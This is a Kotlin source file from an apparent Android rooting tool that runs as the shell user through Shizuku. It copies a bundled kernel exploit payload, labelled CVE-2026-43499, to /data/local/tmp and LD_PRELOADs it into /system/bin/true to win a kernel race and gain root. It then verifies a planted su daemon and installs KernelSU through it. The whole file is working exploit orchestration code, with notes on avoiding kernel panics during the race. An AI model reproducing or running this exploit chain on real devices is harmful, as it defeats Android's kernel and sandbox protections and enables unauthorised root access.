package com.ghostlock.pad.shizuku

import android.content.Context
import android.os.Process
import androidx.annotation.Keep
import com.ghostlock.pad.EngineContract
import com.ghostlock.pad.data.ManagerScanner
import com.ghostlock.pad.engine.KsuScript
import java.io.File
import java.io.RandomAccessFile
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Runs inside the Shizuku server process as the shell user. The bundled
 * CVE-2026-43499 payload is an LD_PRELOAD library: staged to /data/local/tmp,
 * preloaded into /system/bin/true, and driven with file-redirected output so
 * the exploit's PI race window never sees pipe backpressure (the same lesson
 * GhostLock-app learned the hard way).
 */
@Keep
class EngineUserService(private val context: Context) : IEngineService.Stub() {
    private val running = AtomicBoolean(false)

    override fun probe(): String = runCatching {
        val release = kernelRelease()
        buildString {
            appendLine("kernel=$release")
            appendLine("gate=${if (release == EngineContract.EXPECTED_KERNEL) 1 else 0}")
            appendLine("uid=${Process.myUid()}")
            appendLine("shell=${if (Process.myUid() == Process.SHELL_UID) 1 else 0}")
            appendLine("seccomp=${seccompMode()}")
            appendLine("root=${if (probeRoot(null) != null) 1 else 0}")
            appendLine("preload=${if (File(EngineContract.PRELOAD_PATH).isFile) "staged" else "missing"}")
        }.trim()
    }.getOrElse { "error=${it.message}" }

    override fun run(expectedKernel: String, managerPackage: String?, callback: IEngineCallback) {
        if (!running.compareAndSet(false, true)) {
            callback.onLog("<s> error: another GhostLock run is already in progress")
            callback.onComplete(EngineContract.EXIT_FAILED, "busy")
            return
        }
        Thread({
            val exit = execute(expectedKernel, managerPackage, callback)
            running.set(false)
            runCatching { callback.onComplete(exit.first, exit.second) }
        }, "ghostlock-pad-engine").start()
    }

    private fun execute(
        expectedKernel: String,
        managerPackage: String?,
        callback: IEngineCallback,
    ): Pair<Int, String> = runCatching {
        require(Process.myUid() == Process.SHELL_UID) {
            "Shizuku UserService uid=${Process.myUid()}, expected shell ${Process.SHELL_UID}"
        }
        val seccomp = seccompMode()
        require(seccomp == 0) { "Shizuku UserService is still seccomp-filtered (mode=$seccomp)" }

        val release = kernelRelease()
        log(callback, "<s> shell ready: uid=${Process.myUid()} seccomp=$seccomp")
        log(callback, "<s> kernel: $release")
        require(release == expectedKernel) {
            "kernel gate failed: running '$release', payload built for '$expectedKernel'"
        }

        // ---- Stage: copy the bundled payload out of the APK. ----
        phase(callback, EngineContract.PHASE_STAGE)
        val bundled = File(context.applicationInfo.nativeLibraryDir, EngineContract.BUNDLED_PRELOAD_LIB)
        require(bundled.isFile && bundled.length() > 0) {
            "missing bundled payload: ${bundled.absolutePath}"
        }
        val workDir = File(EngineContract.WORK_DIR).apply {
            require(isDirectory || mkdirs()) { "cannot create ${absolutePath}" }
        }
        val preload = File(EngineContract.PRELOAD_PATH)
        bundled.copyTo(preload, overwrite = true)
        runCatching { preload.setLastModified(bundled.lastModified()) }
        ProcessBuilder("chmod", "0644", preload.absolutePath).start().waitFor()
        require(preload.isFile && preload.length() == bundled.length()) { "staging ${preload.absolutePath} failed" }
        log(callback, "<s> staged payload: ${preload.absolutePath} (${preload.length()} bytes, mode 0644)")

        // Resolve ksud before touching the kernel; shell can read the
        // manager APK's extracted native libs directly.
        val ksudPath = resolveKsud(managerPackage, callback)

        // ---- Exploit: LD_PRELOAD the payload into /system/bin/true. ----
        phase(callback, EngineContract.PHASE_EXPLOIT)
        log(callback, "<b> launching exploit (LD_PRELOAD=$preload)")
        val exploitLog = File(EngineContract.EXPLOIT_LOG)
        val process = ProcessBuilder("/system/bin/true")
            .redirectErrorStream(true)
            .redirectOutput(exploitLog)
            .apply { environment()["LD_PRELOAD"] = preload.absolutePath }
            .start()
        val tailer = Thread({ relayLog(exploitLog) { line -> log(callback, line) } },
            "ghostlock-pad-tailer").apply {
            isDaemon = true
            start()
        }
        val exitCode = process.waitFor()
        Thread.sleep(300)
        tailer.interrupt()
        tailer.join(1000)
        log(callback, "<b> exploit process exited code=$exitCode")

        // ---- Verify: the payload leaves su + a root daemon behind. ----
        phase(callback, EngineContract.PHASE_VERIFY)
        val idOut = probeRoot(callback)
        if (idOut == null) {
            log(callback, "<s> error: root is not available (exploit failed or daemon died)")
            return@runCatching EngineContract.EXIT_FAILED to "root=0 ksu=0"
        }
        log(callback, "[+] root verified: $idOut")

        // ---- KernelSU late-load through the payload's su daemon. ----
        var ksuOk = false
        if (ksudPath != null) {
            phase(callback, EngineContract.PHASE_KSU)
            ksuOk = installKernelsu(ksudPath, managerPackage, callback)
        } else {
            log(callback, "[!] no ksud found; skipping KernelSU install (root only)")
        }

        phase(callback, EngineContract.PHASE_DONE)
        val summary = "root=1 ksu=${if (ksuOk) 1 else 0} uid=0 su=${EngineContract.SU_PATH}"
        EngineContract.EXIT_OK_ROOT to summary
    }.getOrElse { error ->
        log(callback, "<s> error: ${error.message}")
        EngineContract.EXIT_FAILED to "error"
    }

    /** Writes and executes the KernelSU install script via `su -c`. */
    private fun installKernelsu(
        ksudPath: String,
        managerPackage: String?,
        callback: IEngineCallback,
    ): Boolean = runCatching {
        val scriptFile = File(EngineContract.KSU_SCRIPT_PATH)
        scriptFile.writeText(KsuScript.build(ksudPath, managerPackage ?: ""))
        ProcessBuilder("chmod", "0755", scriptFile.absolutePath).start().waitFor()
        log(callback, "<b> running KernelSU install via su daemon")
        val ksuLog = File(EngineContract.KSU_LOG)
        val process = ProcessBuilder(EngineContract.SU_PATH, "-c",
            "sh ${scriptFile.absolutePath}")
            .redirectErrorStream(true)
            .redirectOutput(ksuLog)
            .start()
        val tailer = Thread({ relayLog(ksuLog) { line -> log(callback, line) } },
            "ghostlock-pad-ksu-tailer").apply {
            isDaemon = true
            start()
        }
        // The script internally waits up to 30s for the module; give it headroom.
        val finished = process.waitFor(90, java.util.concurrent.TimeUnit.SECONDS)
        if (!finished) {
            process.destroyForcibly()
            log(callback, "<s> error: KernelSU install timed out")
        }
        Thread.sleep(300)
        tailer.interrupt()
        tailer.join(1000)
        val modules = runSuCommand("grep -c kernelsu /proc/modules", callback)
        val ok = finished && ((modules?.trim()?.toIntOrNull() ?: 0) > 0)
        if (ok) {
            log(callback, "[+] KernelSU is loaded (${modules!!.trim()} module entries)")
        } else {
            log(callback, "[!] KernelSU module not confirmed; root still available via ${EngineContract.SU_PATH}")
        }
        ok
    }.getOrElse { error ->
        log(callback, "<s> KernelSU install failed: ${error.message}")
        false
    }

    /** Runs `su -c <cmd>` and returns its combined output, or null on failure. */
    private fun runSuCommand(cmd: String, callback: IEngineCallback?): String? = runCatching {
        val outFile = File(EngineContract.WORK_DIR, "su_cmd.out")
        val process = ProcessBuilder(EngineContract.SU_PATH, "-c", cmd)
            .redirectErrorStream(true)
            .redirectOutput(outFile)
            .start()
        val finished = process.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
        if (!finished) {
            process.destroyForcibly()
            return@runCatching null
        }
        if (process.exitValue() != 0) {
            return@runCatching null
        }
        outFile.readText().trim()
    }.getOrElse {
        callback?.let { c -> log(c, "<s> su command failed: ${it.message}") }
        null
    }

    /** Runs `su -c id` and returns the id string when root is live. */
    private fun probeRoot(callback: IEngineCallback?): String? {
        val out = runSuCommand("id", callback) ?: return null
        return out.takeIf { it.contains("uid=0(") }
    }

    /** Same ksud resolution order as GhostLock-app: chosen package, built-ins. */
    private fun resolveKsud(managerPackage: String?, callback: IEngineCallback): String? {
        val pm = context.packageManager
        val path = ManagerScanner.resolvePackages(managerPackage)
            .asSequence()
            .map { pkg ->
                runCatching {
                    File(pm.getApplicationInfo(pkg, 0).nativeLibraryDir, "libksud.so")
                }.getOrNull()?.takeIf { it.isFile }
            }
            .firstOrNull { it != null }
            ?.absolutePath
        if (path != null) {
            log(callback, "<s> ksud resolved: $path")
        }
        return path
    }

    private fun kernelRelease(): String = System.getProperty("os.version", "").orEmpty()

    private fun seccompMode(): Int = runCatching {
        Regex("(?m)^Seccomp:\\s*(\\d+)").find(File("/proc/self/status").readText())
            ?.groupValues?.get(1)?.toInt()
    }.getOrNull() ?: -1

    private fun log(callback: IEngineCallback, line: String) {
        runCatching { callback.onLog(line) }
    }

    private fun phase(callback: IEngineCallback, name: String) {
        runCatching { callback.onPhase(name) }
    }

    /**
     * Forwards complete lines from a file without ever blocking the child:
     * the file is the transport, binder is only the display path. Reading a
     * pipe instead applied backpressure inside the PI race window and
     * stalled the route into a kernel panic.
     */
    private fun relayLog(logFile: File, onLine: (String) -> Unit) {
        var offset = 0L
        val pending = StringBuilder()
        while (!Thread.currentThread().isInterrupted) {
            try {
                if (logFile.isFile) {
                    RandomAccessFile(logFile, "r").use { handle ->
                        if (offset > handle.length()) {
                            offset = 0
                            pending.clear()
                        }
                        handle.seek(offset)
                        while (true) {
                            val byte = handle.read()
                            if (byte == -1) break
                            if (byte == '\n'.code) {
                                val line = pending.toString()
                                pending.clear()
                                offset = handle.filePointer
                                if (line.isNotEmpty()) onLine(line)
                            } else {
                                pending.append(byte.toChar())
                            }
                        }
                    }
                }
                Thread.sleep(100)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return
            } catch (_: Exception) {
                try {
                    Thread.sleep(200)
                } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return
                }
            }
        }
    }

    override fun destroy() {
        if (!running.get()) kotlin.system.exitProcess(0)
    }
}
